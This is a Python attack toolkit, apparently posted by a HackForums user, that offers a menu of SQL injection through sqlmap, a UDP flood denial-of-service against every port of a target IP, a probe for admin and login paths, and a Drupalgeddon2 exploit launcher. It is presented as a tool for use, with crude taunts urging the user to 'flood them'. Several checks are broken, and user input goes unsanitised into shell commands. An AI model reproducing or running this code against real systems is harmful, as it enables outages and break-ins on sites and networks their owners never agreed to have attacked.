#C0ded by Pr1m1t1ve - Evil Dwells Here - https://hackforums.net/member.php?action=profile&uid=4033779
from os import system
import threading
import socket
import random
import sys
import time
import os
import http.client
import paramiko as pm


attackMenu = ["1. SQL Injection", "2. DoS", "3. DrupalGeddon2(Admin)", "4. File Enumerator"]


def attackplat():
    system('clear')
    banner2 = """\033[92m

     @@@@@@   @@@@@@@  @@@@@@@   @@@@@@    @@@@@@@  @@@  @@@  
    @@@@@@@@  @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  
    @@!  @@@    @@!      @@!    @@!  @@@  !@@       @@!  !@@  
    !@!  @!@    !@!      !@!    !@!  @!@  !@!       !@!  @!!  
    @!@!@!@!    @!!      @!!    @!@!@!@!  !@!       @!@@!@!   
    !!!@!!!!    !!!      !!!    !!!@!!!!  !!!       !!@!!!    
    !!:  !!!    !!:      !!:    !!:  !!!  :!!       !!: :!!   
    :!:  !:!    :!:      :!:    :!:  !:!  :!:       :!:  !:!  
    ::   :::     ::       ::    ::   :::   ::: :::   ::  :::  
     :   : :     :        :      :   : :   :: :: :   :   :::                                                            
    \033[91m________________________________________________________

                         Round 1 | Fight
    ________________________________________________________
    """

    print(banner2)
    for x in range(len(attackMenu)):
        print (attackMenu[x])

    attackInput = int(input("\n\033[31m[+] \033[36mWhat method should we use? "))

    if attackInput == 1:
        system('clear')
        print(banner2)
        klap.sqli()
    elif attackInput == 2:
        system('clear')
        print(banner2)
        klap.dos()
    elif attackInput == 4:
        system('clear')
        print(banner2)
        klap.enumerator()
    elif attackInput == 3:
        system('clear')
        print(banner2)
        klap.drupal()
    else:
        system('clear')
        print("Please use correct syntax")
    return

class attack():

    def sqli(self):
        host = input("\n\033[31m[x]\033[36m URL: ")
        system('sqlmap -a -u ' + host + '--threads=10')
        if KeyboardInterrupt:
            print("Lil Bitch ass hoe")
            attackplat()
        attackplat()
        return

    def dos(self):
        host = input("\033[31m[x] \033[36mIP Address: ")
        port = 1
        data = os.urandom(4096)
        dur = int(input("Duration: "))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent = int(0)
        timeout = time.time()+dur
        while 1 == 1:
            try:
                if time.time()>timeout:
                    sys.exit()
                else:
                    sock.sendto(data, (host, port))
                    sent = sent+1

                if port == 65535:
                    port = 1
                else:
                    port = port+1
                    print (sent, host, port)
            except KeyboardInterrupt:
                print("Dont be a lil bitch, flood them !")
                attackplat()

                return


    def enumerator(self):
        host = input("\033[31m[+]\033[36m Host: ")
        port = 80
        conn = http.client.HTTPConnection(host, port)


        fileEnum = ["/admin", "/phpmyadmin", "/login", "/register", "/admin.php", "/register.php", "/info.php", "/wp-admin.php", "/admin/", "/install/", "/ADM", "/ADMIN", "/README.txt", "/README.html", "/index.php", "/index", "/login.php"]
        http.client.HTTPConnection(host, port,[10])
        if http.client.HTTPResponse == http.client.HTTPException:
            sys.exit(http.client.HTTPException)
        else:
            for x in range(len(fileEnum)):
                conn.request("GET", fileEnum[x], bytes(10))
                r1 = conn.getresponse()
                r1.read()
                if int(r1.status) == 200:
                    print("\033[92m" + fileEnum[x] + " - Directory/File found")
                elif int(r1.status) == 301 or int(r1.status) == 302:
                    print("\033[92m" + fileEnum[x] + " - Redirects")

            input("\033[31m[+] \033[36mPress any key to proceed (WHERES THE ANY KEY??")
        if KeyboardInterrupt:
            print("Blyat")
            attackplat()
        attackplat()
        return



    def drupal(self):
        host = input("\033[31m[+]\033[36m Host")
        system('ruby drupalgeddon.rb ' + host + ' --verbose')
        if KeyboardInterrupt:
            attackplat()
        else:

            attackplat()
        return

klap = attack()